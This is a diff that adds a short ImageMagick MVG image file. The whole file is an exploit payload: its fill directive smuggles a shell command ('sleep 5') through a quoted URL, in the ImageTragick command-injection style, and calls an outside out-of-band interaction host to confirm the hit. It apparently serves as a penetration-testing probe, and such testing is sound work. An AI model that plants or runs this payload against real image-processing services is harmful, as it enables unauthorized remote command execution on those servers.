@@ -1,0 +1,4 @@
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://s7004nchh0l5bb0kxoxorv55lwrnfd32.oastify.com/image.jpg"|sleep 5")'
+pop graphic-context
